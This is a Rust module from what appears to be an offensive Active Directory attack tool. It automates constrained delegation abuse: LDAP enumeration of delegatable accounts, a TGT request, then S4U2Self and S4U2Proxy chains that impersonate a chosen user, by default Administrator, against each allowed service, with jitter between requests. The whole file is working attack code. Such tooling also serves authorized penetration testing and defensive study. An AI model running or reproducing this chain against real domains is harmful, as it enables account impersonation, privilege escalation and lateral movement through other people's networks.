//! Constrained Delegation abuse — Enumerate accounts with
//! msDS-AllowedToDelegateTo and perform S4U2Self → S4U2Proxy
//! impersonation chains to access target services as any user.
//!
//! Typical attack flow:
//! 1. LDAP enum: find accounts with TRUSTED_TO_AUTH_FOR_DELEGATION
//! 2. Obtain TGT for the delegatable account
//! 3. S4U2Self → get ticket impersonating target user
//! 4. S4U2Proxy → get service ticket for the allowed SPN

use crate::runner::HuntConfig;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::error::Result;
use overthrone_core::proto::kerberos::{self, TicketGrantingData};
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

// ═══════════════════════════════════════════════════════════
// UAC constants for delegation
// ═══════════════════════════════════════════════════════════

/// TRUSTED_TO_AUTH_FOR_DELEGATION — allows S4U2Self without user interaction
const UAC_TRUSTED_TO_AUTH_FOR_DELEGATION: u32 = 0x01000000;
/// Account is disabled
const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct ConstrainedConfig {
    /// If set, skip LDAP enum and use this account as the delegation source
    pub source_account: Option<String>,
    /// User to impersonate (default: "Administrator")
    pub impersonate_user: String,
    /// Target SPN to access (if None, use msDS-AllowedToDelegateTo)
    pub target_spn: Option<String>,
    /// Only enumerate, don't perform the S4U chain
    pub enumerate_only: bool,
    /// Export obtained tickets to file
    pub export_tickets: bool,
}

impl Default for ConstrainedConfig {
    fn default() -> Self {
        Self {
            source_account: None,
            impersonate_user: "Administrator".to_string(),
            target_spn: None,
            enumerate_only: false,
            export_tickets: false,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConstrainedResult {
    /// Accounts with constrained delegation configured
    pub delegatable_accounts: Vec<DelegatableAccount>,
    /// Successful S4U chains performed
    pub s4u_chains: Vec<S4UChainResult>,
    /// Errors during enumeration or exploitation
    pub errors: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DelegatableAccount {
    pub sam_account_name: String,
    pub distinguished_name: String,
    /// SPNs this account is allowed to delegate to
    pub allowed_to_delegate_to: Vec<String>,
    /// Whether T2A4D is set (protocol transition enabled)
    pub protocol_transition: bool,
    pub account_type: String,
    pub admin_count: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct S4UChainResult {
    pub source_account: String,
    pub impersonated_user: String,
    pub target_spn: String,
    pub success: bool,
    pub error: Option<String>,
}

// ═══════════════════════════════════════════════════════════
// LDAP Enumeration
// ═══════════════════════════════════════════════════════════

/// Enumerate accounts with constrained delegation configured
async fn enumerate_constrained(config: &HuntConfig) -> Result<Vec<DelegatableAccount>> {
    info!("LDAP: Enumerating constrained delegation accounts");

    let mut conn = if config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    };

    let ad_users = conn.find_constrained_delegation_users().await?;

    let mut accounts = Vec::new();

    for u in &ad_users {
        // Skip disabled accounts
        if (u.user_account_control & UAC_ACCOUNT_DISABLE) != 0 {
            continue;
        }

        let protocol_transition =
            (u.user_account_control & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION) != 0;

        let account_type = if u.sam_account_name.ends_with('$') {
            "Computer".to_string()
        } else {
            "User".to_string()
        };

        accounts.push(DelegatableAccount {
            sam_account_name: u.sam_account_name.clone(),
            distinguished_name: u.distinguished_name.clone(),
            allowed_to_delegate_to: u.allowed_to_delegate_to.clone(),
            protocol_transition,
            account_type,
            admin_count: u.admin_count,
        });
    }

    conn.disconnect().await?;

    info!(
        "LDAP: Found {} constrained delegation accounts",
        accounts.len()
    );
    Ok(accounts)
}

// ═══════════════════════════════════════════════════════════
// S4U Chain Execution
// ═══════════════════════════════════════════════════════════

/// Perform the full S4U2Self → S4U2Proxy chain for one delegation path
async fn execute_s4u_chain(
    config: &HuntConfig,
    tgt: &TicketGrantingData,
    impersonate_user: &str,
    target_spn: &str,
) -> S4UChainResult {
    info!(
        "S4U chain: {} → {} as {}",
        tgt.client_principal, target_spn, impersonate_user
    );

    // Step 1: S4U2Self — get a ticket for ourselves impersonating the target user
    let s4u2self_ticket = match kerberos::s4u2self(&config.dc_ip, tgt, impersonate_user).await {
        Ok(t) => t,
        Err(e) => {
            return S4UChainResult {
                source_account: tgt.client_principal.clone(),
                impersonated_user: impersonate_user.to_string(),
                target_spn: target_spn.to_string(),
                success: false,
                error: Some(format!("S4U2Self failed: {e}")),
            };
        }
    };

    info!(
        "  {} S4U2Self ticket for {} obtained",
        "✓".green(),
        impersonate_user
    );

    // Step 2: S4U2Proxy — use the S4U2Self ticket to get a ticket for the target service
    match kerberos::s4u2proxy(&config.dc_ip, tgt, &s4u2self_ticket, target_spn).await {
        Ok(_service_ticket) => {
            info!(
                "  {} S4U2Proxy ticket for {} as {} obtained",
                "✓".green(),
                target_spn.bold(),
                impersonate_user.bold()
            );
            S4UChainResult {
                source_account: tgt.client_principal.clone(),
                impersonated_user: impersonate_user.to_string(),
                target_spn: target_spn.to_string(),
                success: true,
                error: None,
            }
        }
        Err(e) => {
            warn!("  {} S4U2Proxy failed for {}: {}", "✗".red(), target_spn, e);
            S4UChainResult {
                source_account: tgt.client_principal.clone(),
                impersonated_user: impersonate_user.to_string(),
                target_spn: target_spn.to_string(),
                success: false,
                error: Some(format!("S4U2Proxy failed: {e}")),
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

pub async fn run(config: &HuntConfig, cc: &ConstrainedConfig) -> Result<ConstrainedResult> {
    info!("{}", "═══ CONSTRAINED DELEGATION ═══".bold().blue());

    // Step 1: Enumerate constrained delegation accounts
    let accounts = enumerate_constrained(config).await?;

    // Display enumeration results
    for acct in &accounts {
        let t2a4d_label = if acct.protocol_transition {
            "[T2A4D]".green().to_string()
        } else {
            "[no T2A4D]".yellow().to_string()
        };

        info!(
            "  {} {} ({}) {} → {:?}",
            "→".cyan(),
            acct.sam_account_name.bold(),
            acct.account_type.dimmed(),
            t2a4d_label,
            acct.allowed_to_delegate_to
        );
    }

    if cc.enumerate_only || accounts.is_empty() {
        return Ok(ConstrainedResult {
            delegatable_accounts: accounts,
            s4u_chains: Vec::new(),
            errors: Vec::new(),
        });
    }

    // Step 2: Obtain TGT for our account
    let tgt = match &config.tgt {
        Some(t) => t.clone(),
        None => {
            kerberos::request_tgt(
                &config.dc_ip,
                &config.domain,
                &config.username,
                &config.secret,
                config.use_hash,
            )
            .await?
        }
    };

    // Step 3: Execute S4U chains
    let mut chains = Vec::new();
    let mut errors = Vec::new();

    let targets: Vec<(&DelegatableAccount, String)> = if let Some(ref spn) = cc.target_spn {
        // User specified a target SPN
        accounts.iter().map(|a| (a, spn.clone())).collect()
    } else {
        // Use each account's allowed delegation targets
        accounts
            .iter()
            .flat_map(|a| {
                a.allowed_to_delegate_to
                    .iter()
                    .map(move |spn| (a, spn.clone()))
            })
            .collect()
    };

    let pb = ProgressBar::new(targets.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.blue} [{bar:40.blue/dim}] {pos}/{len} S4U chain {msg}")
            .unwrap()
            .progress_chars("█▓░"),
    );

    for (acct, target_spn) in &targets {
        pb.set_message(format!("{} → {}", acct.sam_account_name, target_spn));

        // Only accounts with protocol transition can do S4U2Self without the user
        if !acct.protocol_transition {
            warn!(
                "  {} {} has no protocol transition (T2A4D) — S4U2Self may fail",
                "⚠".yellow(),
                acct.sam_account_name
            );
        }

        let result = execute_s4u_chain(config, &tgt, &cc.impersonate_user, target_spn).await;

        if let Some(ref err) = result.error {
            errors.push(err.clone());
        }

        chains.push(result);
        config.apply_jitter().await;
        pb.inc(1);
    }

    pb.finish_with_message("done");

    let successful = chains.iter().filter(|c| c.success).count();
    info!(
        "Constrained delegation: {}/{} S4U chains succeeded",
        successful.to_string().green(),
        chains.len()
    );

    Ok(ConstrainedResult {
        delegatable_accounts: accounts,
        s4u_chains: chains,
        errors,
    })
}
